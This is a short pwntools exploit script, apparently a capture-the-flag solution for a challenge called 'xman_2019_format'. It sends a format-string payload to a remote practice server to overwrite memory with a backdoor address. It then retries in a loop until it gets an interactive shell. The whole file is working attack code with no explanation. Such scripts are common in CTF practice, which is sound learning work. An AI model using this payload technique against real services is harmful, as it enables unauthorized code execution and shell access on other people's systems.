from pwn import *

backdoor = 0x80485ab

payload = b'%28c%10$hhn|%34219c%18$hn'

while True:
    try:
        #p = process('./xman_2019_format')
        p = remote('node4.buuoj.cn', 25434)
        p.sendlineafter(b'...\n...\n', payload)
        p.recv(timeout=1)
        p.sendline(b'whoami')
        while True:
            p.sendline(b'ls')
            if (p.recvline_contains(b'var')):
                try:
                    p.interactive()
                except:
                    exit()
    except:
        p.close()